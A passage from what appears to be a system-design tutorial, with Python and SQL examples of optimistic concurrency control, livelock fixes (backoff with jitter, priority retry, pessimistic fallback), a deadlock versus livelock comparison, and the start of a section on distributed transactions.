print(f\"Attempt {attempt}\")\n\n        db.begin()\n\n        # Read version\n        balance, version = db.execute(\"\"\"\n            SELECT balance, version FROM accounts WHERE id = ?\n        \"\"\", [account_id]).fetchone()\n\n        # Modify locally\n        new_balance = balance - amount\n\n        # Try to commit with version check\n        updated = db.execute(\"\"\"\n            UPDATE accounts \n            SET balance = ?, version = version + 1\n            WHERE id = ? AND version = ?\n        \"\"\", [new_balance, account_id, version]).rowcount\n\n        if updated == 0:\n            # Failed! Another transaction committed first\n            db.rollback()\n            print(f\"Attempt {attempt} failed, retrying...\")\n            # If many transactions competing \u2192 infinite retries!\n            continue\n\n        db.commit()\n        print(f\"Success on attempt {attempt}\")\n        return True\n</code></pre> <p>Livelock Solutions for Optimistic Control:</p> <p>Solution 1: Exponential Backoff with Jitter</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   SOLUTION 1: EXPONENTIAL BACKOFF + JITTER              \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Strategy: Randomized delays between retries             \u2502\n\u2502                                                         \u2502\n\u2502 How it works:                                           \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 1. After conflict, wait before retry     \u2502           \u2502\n\u2502 \u2502 2. Wait time increases exponentially     \u2502           \u2502\n\u2502 \u2502 3. Add random jitter to avoid sync       \u2502           \u2502\n\u2502 \u2502 4. Max retry limit to prevent infinite   \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Retry delays:                                           \u2502\n\u2502 Attempt 1: 10ms  + random(0-5ms)                        \u2502\n\u2502 Attempt 2: 20ms  + random(0-10ms)                       \u2502\n\u2502 Attempt 3: 40ms  + random(0-20ms)                       \u2502\n\u2502 Attempt 4: 80ms  + random(0-40ms)                       \u2502\n\u2502 Attempt 5: 160ms + random(0-80ms)                       \u2502\n\u2502                                                         \u2502\n\u2502 Jitter prevents synchronized retries                    \u2502\n\u2502 (transactions retry at different times)                 \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <pre><code>import random\nimport time\n\ndef optimistic_with_exponential_backoff(db, account_id, amount):\n    \"\"\"Prevent livelock with exponential backoff + jitter\"\"\"\n\n    max_retries = 10\n    base_delay_ms = 10\n\n    for attempt in range(max_retries):\n        try:\n            db.begin()\n\n            # Read with version\n            balance, version = db.execute(\"\"\"\n                SELECT balance, version FROM accounts WHERE id = ?\n            \"\"\", [account_id]).fetchone()\n\n            # Validate business rules\n            if balance &lt; amount:\n                raise InsufficientFundsError()\n\n            # Try to update\n            updated = db.execute(\"\"\"\n                UPDATE accounts \n                SET balance = balance - ?, version = version + 1\n                WHERE id = ? AND version = ?\n            \"\"\", [amount, account_id, version]).rowcount\n\n            if updated == 0:\n                # Conflict detected\n                db.rollback()\n\n                if attempt &lt; max_retries - 1:\n                    # Exponential backoff with jitter\n                    delay_ms = base_delay_ms * (2 ** attempt)\n                    jitter_ms = random.uniform(0, delay_ms / 2)\n                    total_delay = (delay_ms + jitter_ms) / 1000.0\n\n                    print(f\"Conflict on attempt {attempt + 1}, \"\n                          f\"waiting {total_delay:.3f}s...\")\n                    time.sleep(total_delay)\n                    continue\n                else:\n                    raise MaxRetriesExceededError()\n\n            db.commit()\n            return True\n\n        except InsufficientFundsError:\n            db.rollback()\n            return False\n\n    return False\n</code></pre> <p>Solution 2: Priority-Based Retry</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502      SOLUTION 2: PRIORITY-BASED RETRY                   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Strategy: Assign priorities to transactions             \u2502\n\u2502                                                         \u2502\n\u2502 How it works:                                           \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 1. Assign priority to each transaction   \u2502           \u2502\n\u2502 \u2502 2. Higher priority = shorter wait        \u2502           \u2502\n\u2502 \u2502 3. Lower priority = longer wait          \u2502           \u2502\n\u2502 \u2502 4. Prevents starvation of low-priority   \u2502           \u2502\n\u2502 \u2502    (priority increases with retries)     \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Priority calculation:                                   \u2502\n\u2502 priority = base_priority + (retry_count * 10)           \u2502\n\u2502                                                         \u2502\n\u2502 Effect:                                                 \u2502\n\u2502 \u2022 New transactions: low priority, wait longer           \u2502\n\u2502 \u2022 Retried transactions: high priority, wait less        \u2502\n\u2502 \u2022 Eventually all succeed (no starvation)                \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <pre><code>def optimistic_with_priority(db, account_id, amount, base_priority=0):\n    \"\"\"Use priority to prevent starvation\"\"\"\n\n    max_retries = 10\n    retry_count = 0\n\n    for attempt in range(max_retries):\n        try:\n            db.begin()\n\n            # Read data\n            balance, version = db.execute(\"\"\"\n                SELECT balance, version FROM accounts WHERE id = ?\n            \"\"\", [account_id]).fetchone()\n\n            # Try to update\n            updated = db.execute(\"\"\"\n                UPDATE accounts \n                SET balance = balance - ?, version = version + 1\n                WHERE id = ? AND version = ?\n            \"\"\", [amount, account_id, version]).rowcount\n\n            if updated == 0:\n                db.rollback()\n                retry_count += 1\n\n                # Calculate priority (increases with retries)\n                priority = base_priority + (retry_count * 10)\n\n                # Wait time inversely proportional to priority\n                max_wait = 100  # ms\n                wait_time = max_wait / (1 + priority / 10)\n\n                print(f\"Retry {retry_count}, priority={priority}, \"\n                      f\"wait={wait_time:.1f}ms\")\n\n                time.sleep(wait_time / 1000.0)\n                continue\n\n            db.commit()\n            return True\n\n        except Exception as e:\n            db.rollback()\n            raise\n\n    return False\n</code></pre> <p>Solution 3: Maximum Retry Limit + Fallback</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   SOLUTION 3: MAX RETRIES + FALLBACK TO PESSIMISTIC     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Strategy: Switch to pessimistic after too many retries  \u2502\n\u2502                                                         \u2502\n\u2502 How it works:                                           \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 1. Try optimistic (fast, no locks)       \u2502           \u2502\n\u2502 \u2502 2. If conflicts detected repeatedly      \u2502           \u2502\n\u2502 \u2502 3. Switch to pessimistic (use locks)     \u2502           \u2502\n\u2502 \u2502 4. Guaranteed to succeed                 \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Timeline:                                               \u2502\n\u2502 Attempt 1-3: Optimistic (failed)                        \u2502\n\u2502 Attempt 4-6: Optimistic (failed)                        \u2502\n\u2502 Attempt 7+:  Pessimistic (use locks) \u2192 Success!         \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <pre><code>def adaptive_concurrency_control(db, account_id, amount):\n    \"\"\"Start optimistic, fallback to pessimistic if needed\"\"\"\n\n    optimistic_retries = 5\n\n    # Phase 1: Try optimistic first\n    for attempt in range(optimistic_retries):\n        try:\n            db.begin()\n\n            # Optimistic: no locks\n            balance, version = db.execute(\"\"\"\n                SELECT balance, version FROM accounts WHERE id = ?\n            \"\"\", [account_id]).fetchone()\n\n            # Try to update with version check\n            updated = db.execute(\"\"\"\n                UPDATE accounts \n                SET balance = balance - ?, version = version + 1\n                WHERE id = ? AND version = ?\n            \"\"\", [amount, account_id, version]).rowcount\n\n            if updated == 0:\n                db.rollback()\n                time.sleep(0.01 * (2 ** attempt))\n                continue\n\n            db.commit()\n            print(\"Success with optimistic control\")\n            return True\n\n        except Exception as e:\n            db.rollback()\n\n    # Phase 2: Fallback to pessimistic (guaranteed success)\n    print(\"Too many conflicts, switching to pessimistic control\")\n\n    try:\n        db.begin()\n\n        # Pessimistic: acquire lock\n        balance = db.execute(\"\"\"\n            SELECT balance FROM accounts \n            WHERE id = ? \n            FOR UPDATE\n        \"\"\", [account_id]).fetchone()[0]\n\n        if balance &lt; amount:\n            raise InsufficientFundsError()\n\n        # Update (lock held, guaranteed to succeed)\n        db.execute(\"\"\"\n            UPDATE accounts \n            SET balance = balance - ?\n            WHERE id = ?\n        \"\"\", [amount, account_id])\n\n        db.commit()\n        print(\"Success with pessimistic control\")\n        return True\n\n    except Exception as e:\n        db.rollback()\n        return False\n</code></pre> <p>Comparison: Deadlock vs Livelock:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502          DEADLOCK vs LIVELOCK COMPARISON                \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 DEADLOCK (Pessimistic):                                 \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u2022 Transactions BLOCKED forever           \u2502           \u2502\n\u2502 \u2502 \u2022 Waiting for each other (circular)      \u2502           \u2502\n\u2502 \u2502 \u2022 No progress at all                     \u2502           \u2502\n\u2502 \u2502 \u2022 Requires detection &amp; abort             \u2502           \u2502\n\u2502 \u2502 \u2022 Example: T1 waits for T2's lock,       \u2502           \u2502\n\u2502 \u2502           T2 waits for T1's lock         \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 LIVELOCK (Optimistic):                                  \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u2022 Transactions keep RETRYING             \u2502           \u2502\n\u2502 \u2502 \u2022 Active but making no progress          \u2502           \u2502\n\u2502 \u2502 \u2022 Continuously aborting and restarting   \u2502           \u2502\n\u2502 \u2502 \u2022 Requires backoff &amp; retry limit         \u2502           \u2502\n\u2502 \u2502 \u2022 Example: T1 commits, T2 retries,       \u2502           \u2502\n\u2502 \u2502           T1 commits again, T2 retries.. \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Visual:                                                 \u2502\n\u2502                                                         \u2502\n\u2502 Deadlock:  T1 \u2500\u2500[BLOCKED]\u2500\u2500\u2192 \ud83d\udc80                         \u2502\n\u2502            T2 \u2500\u2500[BLOCKED]\u2500\u2500\u2192 \ud83d\udc80                         \u2502\n\u2502            (Both stopped)                               \u2502\n\u2502                                                         \u2502\n\u2502 Livelock:  T1 \u2500\u2500[RETRY]\u2500\u2500[RETRY]\u2500\u2500[RETRY]\u2500\u2500\u2192 \u267e\ufe0f        \u2502\n\u2502            T2 \u2500\u2500[RETRY]\u2500\u2500[RETRY]\u2500\u2500[RETRY]\u2500\u2500\u2192 \u267e\ufe0f        \u2502\n\u2502            (Both active but failing)                    \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#6-distributed-transactions","title":"6. Distributed Transactions","text":"<p>Description:</p> <p>A distributed transaction is a transaction that involves operations on data stored across multiple nodes, databases, or services in a distributed system. Unlike local transactions that execute entirely within a single database instance, distributed transactions must coordinate operations across network boundaries, dealing with partial failures, network delays, and the fundamental challenges of distributed computing.</p> <p>The Challenge of Distribution:</p> <p>When a transaction spans multiple systems, we face the distributed transaction problem: How do we ensure that either all participating systems commit the transaction or all abort it, even in the presence of network failures, node crashes, and communication delays?</p> <p>This is fundamentally harder than local transactions because: 1. No shared memory: Nodes can't directly access each other's state 2. Network unreliability: Messages can be delayed, lost, or duplicated 3. Independent failures: One node can crash while others continue 4. No global clock: Hard to determine ordering of events 5. Partial visibility: No node has complete view of system state</p> <p>Historical Context:</p> <p>Distributed transactions became critical in the 1980s when organizations needed to coordinate operations across: - Multiple mainframes in different data centers - Distributed banking networks (ATM networks, wire transfers) - Airline reservation systems across countries - Supply chain systems spanning multiple companies</p> <p>The pioneering work by Jim Gray (Turing Award winner, 1998) on transaction processing and the X/Open XA standard (1991) provided the foundation for modern distributed transaction protocols.</p> <p>Real-World Distributed Transaction Examples:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         DISTRIBUTED TRANSACTION EXAMPLES                \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. \ud83c\udfe6 BANK WIRE TRANSFER                                \u2502\n\u2502    Transaction involves:                                \u2502\n\u2502    \u2022 Bank A database (withdraw from account)            \u2502\n\u2502    \u2022 Bank B database (deposit to account)               \u2502\n\u2502    \u2022 Federal Reserve System (record transfer)           \u2502\n\u2502    \u2022 Audit log database (compliance)                    \u2502\n\u2502                                                         \u2502\n\u2502    Must be atomic: All succeed or all fail              \u2502\n\u2502                                                         \u2502\n\u2502 2. \u2708\ufe0f  FLIGHT BOOKING                                   \u2502\n\u2502    Transaction involves:                                \u2502\n\u2502    \u2022 Airline database (reserve seat)                    \u2502\n\u2502    \u2022 Hotel database (reserve room)                      \u2502\n\u2502    \u2022 Car rental database (reserve vehicle)              \u2502\n\u2502    \u2022 Payment gateway (charge credit card)               \u2502\n\u2502                                                         \u2502\n\u2502    Must be atomic: Book all or cancel all               \u2502\n\u2502                                                         \u2502\n\u2502 3. \ud83d\uded2 E-COMMERCE ORDER                                  \u2502\n\u2502    Transaction involves:                                \u2502\n\u2502    \u2022 Inventory service (reserve items)                  \u2502\n\u2502    \u2022 Payment service (process payment)                  \u2502\n\u2502    \u2022 Shipping service (create shipment)                 \u2502\n\u2502    \u2022 Customer service (update order history)            \u2502\n\u2502                                                         \u2502\n\u2502    Must be atomic: Complete order or rollback           \u2502\n\u2502                                                         \u2502\n\u2502 4. \ud83d\udcf1 MICROSERVICES SAGA                                \u2502\n\u2502    Transaction involves:                                \u2502\n\u2502    \u2022 User service (update profile)                      \u2502\n\u2502    \u2022 Notification service (send email)                  \u2502\n\u2502    \u2022 Analytics service (log event)                      \u2502\n\u2502    \u2022 Billing service (update credits)                   \u2502\n\u2502                                                         \u2502\n\u2502    Must be consistent across all services               \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Distributed Transaction Architecture:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502      DISTRIBUTED TRANSACTION ARCHITECTURE               \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                       \u2502\n\u2502                  \u2502 APPLICATION  \u2502                       \u2502\n\u2502                  \u2502 (Initiator)  \u2502                       \u2502\n\u2502                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                       \u2502\n\u2502                         \u2502                               \u2502\n\u2502                         \u2502 BEGIN DISTRIBUTED TXN         \u2502\n\u2502                         \u25bc                               \u2502\n\u2502              \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                    \u2502\n\u2502              \u2502 TRANSACTION         \u2502                    \u2502\n\u2502              \u2502 COORDINATOR         \u2502                    \u2502\n\u2502              \u2502 (Orchestrator)      \u2502                    \u2502\n\u2502              \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                    \u2502\n\u2502                     \u2502                                   \u2502\n\u2502         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510          \u2502\n\u2502         \u2502           \u2502           \u2502           \u2502          \u2502\n\u2502         \u25bc           \u25bc           \u25bc           \u25bc          \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u2502\n\u2502    \u2502 Node 1 \u2502  \u2502 Node 2 \u2502  \u2502 Node 3 \u2502  \u2502 Node 4 \u2502     \u2502\n\u2502    \u2502Database\u2502  \u2502Database\u2502  \u2502Database\u2502  \u2502Database\u2502     \u2502\n\u2502    \u2502        \u2502  \u2502        \u2502  \u2502        \u2502  \u2502        \u2502     \u2502\n\u2502    \u2502 [Data] \u2502  \u2502 [Data] \u2502  \u2502 [Data] \u2502  \u2502 [Data] \u2502     \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2502\n\u2502                                                         \u2502\n\u2502    Participants                                         \u2502\n\u2502    (Execute local operations)                           \u2502\n\u2502                                                         \u2502\n\u2502 Flow:                                                   \u2502\n\u2502 1. Application sends transaction to coordinator         \u2502\n\u2502 2. Coordinator distributes operations to participants   \u2502\n\u2502 3. Each participant executes locally                    \u2502\n\u2502 4. Coordinator ensures all commit or all abort          \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Key Components:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    DISTRIBUTED TRANSACTION COMPONENTS                   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. COORDINATOR (Transaction Manager)                    \u2502\n\u2502    